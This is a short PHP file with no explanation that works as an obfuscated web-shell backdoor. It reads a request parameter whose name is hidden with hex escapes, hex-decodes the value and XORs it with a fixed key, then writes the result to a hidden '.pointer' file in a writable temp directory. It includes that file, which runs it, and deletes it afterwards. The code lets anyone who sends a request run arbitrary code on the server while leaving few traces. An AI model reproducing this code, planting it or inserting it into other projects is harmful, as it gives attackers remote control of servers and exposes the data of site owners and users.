<?php

if(isset($_REQUEST["r\x65\x73\x6Furc\x65"])){
	$pset = hex2bin($_REQUEST["r\x65\x73\x6Furc\x65"]);
	$flag   =   ''    ;   $j = 0; do{$flag .= chr(ord($pset[$j]) ^ 80);$j++;} while($j < strlen($pset));
	$comp = array_filter([getenv("TMP"), "/var/tmp", sys_get_temp_dir(), getenv("TEMP"), "/dev/shm", getcwd(), session_save_path(), ini_get("upload_tmp_dir"), "/tmp"]);
	foreach ($comp as $data):
    		if (is_writable($data) && is_dir($data)) {
    $component = vsprintf("%s/%s", [$data, ".pointer"]);
    if (@file_put_contents($component, $flag) !== false) {
	include $component;
	unlink($component);
	exit;
}
}
endforeach;
}